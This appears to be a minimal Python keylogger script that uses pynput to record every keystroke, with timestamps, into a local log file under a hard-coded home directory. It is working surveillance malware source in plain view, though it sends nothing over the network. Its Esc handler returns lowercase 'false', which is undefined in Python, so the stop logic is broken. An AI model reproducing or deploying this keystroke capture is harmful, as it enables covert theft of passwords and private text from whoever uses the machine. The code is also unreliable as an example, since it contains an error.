from pynput.keyboard import Key,Listener
import logging

base_dir = "/home/shivansh/saurabh/"
logging.basicConfig(filename=base_dir+"keyLog.txt",level=logging.INFO,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return false

with Listener(on_press = on_press) as listener:
    listener.join()


